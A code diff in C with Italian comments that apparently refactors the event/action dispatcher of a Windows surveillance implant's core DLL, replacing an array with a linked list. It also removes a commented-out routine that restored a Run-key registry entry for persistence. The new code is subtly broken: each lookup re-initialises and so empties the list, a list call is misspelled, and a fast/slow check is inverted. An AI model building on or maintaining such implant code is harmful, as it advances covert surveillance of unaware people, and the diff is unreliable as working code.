@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <json/JSON.h>
+#include <listentry.h>
 #include "common.h"
 #include "bss.h"
 #include "H4-DLL.h"
@@ -206,29 +207,79 @@ typedef struct {
 } ACTION_ELEM;
 
 typedef struct {
+	LIST_ENTRY entry;
+
 	DWORD subaction_count; // numero di azioni collegate all'evento 
 	ACTION_ELEM *subaction_list; // puntatore all'array delle azioni 
 	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
 	BOOL triggered; // Se l'evento e' triggerato o meno
 } EVENT_ACTION_ELEM;
 
-static EVENT_ACTION_ELEM *event_action_array = NULL; // Puntatore all'array dinamico contenente le actions.
+static LIST_ENTRY event_action_array = {}; // Puntatore all'array dinamico contenente le actions.
                                                      // Si chiude con una entry nulla.
 static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions
+
+static EVENT_ACTION_ELEM* AllocateEventAction()
+{
+	void* ptr = malloc(sizeof(EVENT_ACTION_ELEM));
+	if (ptr != NULL) {
+		memset(ptr, 0, sizeof(EVENT_ACTION_ELEM));
+	}
+
+	return (EVENT_ACTION_ELEM*)ptr;
+}
+
+static EVENT_ACTION_ELEM* GetEventPosition(DWORD pos)
+{
+	InitializeListHead(&event_action_array);
+
+	if (IsListEmpty(&event_action_array))
+		return NULL;
+
+	LIST_ENTRY* head = &event_action_array;
+
+	for (; pos > 0; pos--) {
+		if (head->Flink == &event_action_array)
+			return NULL;
+
+		head = head->Flink;
+	}
+
+	return (EVENT_ACTION_ELEM *)head->Flink;
+}
 
 // Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
 // agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
 // Se l'evento e' stato disabilitato, l'azione non e' triggerata
 void TriggerEvent(DWORD index, DWORD event_id)
 {
-	// Se e' uguale ad AF_NONE sara' sicuramente > event_action_count
-	if (index >= event_action_count)
-		return;
+	EVENT_ACTION_ELEM* entry = GetEventPosition(index);
+	if (entry != NULL) {
+		if (EventIsEnabled(event_id))
+			entry->triggered = TRUE;
+	}
+}
 
-	// L'azione viene effettivamente triggerata solo se l'evento che l'ha generata
-	// e' attivo in quel momento
-	if (EventIsEnabled(event_id))
-		event_action_array[index].triggered = TRUE;
+static BOOL ReadEvent(DWORD* base, DWORD* event_id, BOOL action_type)
+{
+	EVENT_ACTION_ELEM* entry = NULL;
+	do {
+		entry = GetEventPosition(*base);
+
+		if (entry != NULL) {
+			if (entry->triggered && entry->is_fast_action == action_type) {
+				entry->triggered = FALSE;
+				*event_id = *base;
+				*base = *base + 1;
+				return TRUE;
+			}
+		}
+
+		*base = *base + 1;
+	} while (entry != NULL);
+
+	*base = 0;
+	return FALSE;
 }
 
 // Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
@@ -238,37 +289,14 @@ BOOL ReadEventSlow(DWORD *event_id)
 {
 	static DWORD i = 0;
 
-	for (; i<event_action_count; i++) 
-		if (event_action_array[i].triggered && !event_action_array[i].is_fast_action) {
-			event_action_array[i].triggered = FALSE;
-			*event_id = i;
-			// Evita che lo stesso evento possa 
-			// essere triggerato continuamente	
-			i++; 
-			return TRUE;
-		}
-
-	i = 0;
-	return FALSE;
+	return ReadEvent(&i, event_id, FALSE);
 }
 
 // Legge solo azioni veloci
 BOOL ReadEventFast(DWORD *event_id)
 {
 	static DWORD i = 0;
-
-	for (; i<event_action_count; i++) 
-		if (event_action_array[i].triggered && event_action_array[i].is_fast_action) {
-			event_action_array[i].triggered = FALSE;
-			*event_id = i;
-			// Evita che lo stesso evento possa 
-			// essere triggerato continuamente	
-			i++; 
-			return TRUE;
-		}
-
-	i = 0;
-	return FALSE;
+	return ReadEvent(&i, event_id, TRUE);
 }
 
 // Esegue le actions indicate
@@ -276,11 +304,17 @@ void DispatchEvent(DWORD event_id)
 {
 	DWORD i;
 
+	// Se l'evento non esiste nella event_action table ritorna
+	EVENT_ACTION_ELEM* entry = GetEventPosition(event_id);
+
+	if (entry == NULL)
+		return;
+
 	// Se l'action torna TRUE (es: nuova configurazione), smette di eseguire
 	// sottoazioni che potrebbero non esistere piu'
-	for (i=0; i<event_action_array[event_id].subaction_count; i++) {
-		if (event_action_array[event_id].subaction_list[i].pActionFunc) {
-			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param))
+	for (i=0; i<entry->subaction_count; i++) {
+		if (entry->subaction_list[i].pActionFunc) {
+			if (entry->subaction_list[i].pActionFunc(entry->subaction_list[i].param))
 				break;
 		}
 	}
@@ -296,12 +330,14 @@ BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 	DWORD subaction_count;
 
 	// Se l'evento non esiste nella event_action table ritorna
-	if (event_number >= event_action_count)
+	EVENT_ACTION_ELEM* entry = GetEventPosition(event_number);
+
+	if (entry == NULL)
 		return TRUE;
 
 	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
 	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
-	temp_action_list = realloc(event_action_array[event_number].subaction_list, sizeof(ACTION_ELEM) * (event_action_array[event_number].subaction_count + 1) );
+	temp_action_list = realloc(entry->subaction_list, sizeof(ACTION_ELEM) * (entry->subaction_count + 1) );
 
 	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
 	if (!temp_action_list)
@@ -309,16 +345,30 @@ BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 
 	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
 	// e aggiunge la nuova subaction
-	subaction_count = event_action_array[event_number].subaction_count++;
-	event_action_array[event_number].subaction_list = (ACTION_ELEM *)temp_action_list;
-	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
+	subaction_count = entry->subaction_count++;
+	entry->subaction_list = (ACTION_ELEM *)temp_action_list;
+	entry->subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
 
-	event_action_array[event_number].subaction_list[subaction_count].param = param;
+	entry->subaction_list[subaction_count].param = param;
 
 	return is_fast_action;
 }
 
 
+static void DeleteListAction()
+{
+	while (IsListEmpty(&event_action_array) == FALSE) {
+		EVENT_ACTION_ELEM *entry = GetEventPosition(0);
+		if (entry != NULL) {
+			for (DWORD j = 0; j < entry->subaction_count; j++)
+				SAFE_FREE(entry->subaction_list[j].param);
+
+			SAFE_FREE(entry->subaction_list);
+			RemoveEntryList(&entry->entry);
+			free(entry);	// deallocate memory!
+		}
+	}
+}
 
 // Quando questa funzione viene chiamata non ci devono essere thread attivi 
 // che possono chiamare la funizone TriggerEvent. Dovrei proteggerlo come CriticalSection
@@ -328,29 +378,18 @@ void ActionTableInit(DWORD number)
 {
 	DWORD i,j;
 	EVENT_ACTION_ELEM *temp_event_action_array = NULL;
+		
+	DeleteListAction();
 
-	// Libera gli eventuali parametri allocati nella precedente configurazione
-	for (i=0; i<event_action_count; i++) {
-		for (j=0; j<event_action_array[i].subaction_count; j++)
-			SAFE_FREE(event_action_array[i].subaction_list[j].param);
+	event_action_count = 0;
 
-		SAFE_FREE(event_action_array[i].subaction_list);
-	}
-
-	// Alloca una nuova tabella
-	if (number)
-		temp_event_action_array = (EVENT_ACTION_ELEM *)realloc(event_action_array, number * sizeof(EVENT_ACTION_ELEM));
-
-	if (temp_event_action_array) {
-		event_action_count = number;
-		event_action_array = temp_event_action_array;
-		ZERO(event_action_array, number * sizeof(EVENT_ACTION_ELEM));
-		for (i=0; i<event_action_count; i++) 
-			event_action_array[i].is_fast_action = TRUE; // all'inizio conta tutte come fast actions
-	} else {
-		event_action_count = 0;
-		SAFE_FREE(event_action_array);
-		return;
+	for (DWORD n = 0; n < number; n++) {
+		EVENT_ACTION_ELEM *entry = AllocateEventAction();
+		if (entry != NULL) {
+			entry->is_fast_action = TRUE;
+			InsertyTailList(&event_action_array, &entry->entry);
+			event_action_count++;
+		}
 	}
 }
 
@@ -533,8 +572,11 @@ void WINAPI ParseActions(JSONObject conf_json, DWORD counter)
 		conf_ptr = ParseActionParameter(subaction, &tag);
 		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
 		// Basta una subaction slow per marcare tutto l'action
-		if (!ActionTableAddSubAction(counter, tag, conf_ptr)) 
-			event_action_array[counter].is_fast_action = FALSE;
+		if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
+			EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
+			if (entry != NULL)
+				entry->is_fast_action = FALSE;
+		}
 	}
 }
 
@@ -633,25 +675,6 @@ DWORD WINAPI FastActionsThread(DWORD dummy)
 	return 0;
 }
 
-/*
-#define EVERY_N_CYCLES(x) static DWORD i=0; i++; if (i%x == 0)
-void RegistryWatchdog()
-{
-	static char key_value[DLLNAMELEN*3] = "";
-	DWORD key_size;
-	HKEY hOpen;
-
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS)
-		return;
-
-	key_size = sizeof(key_value) - 1;
-	if (RegQueryValueEx(hOpen, REGISTRY_KEY_NAME, NULL, NULL, (unsigned char *)key_value, &key_size) == ERROR_FILE_NOT_FOUND) {
-		if (key_value[0] != 0) // Verifica che abbia un valore memorizzato per la stringa
-			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
-	} 
-
-	FNC(RegCloseKey)(hOpen);
-}*/
 
 // Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
 void SM_MonitorEvents(DWORD dummy)
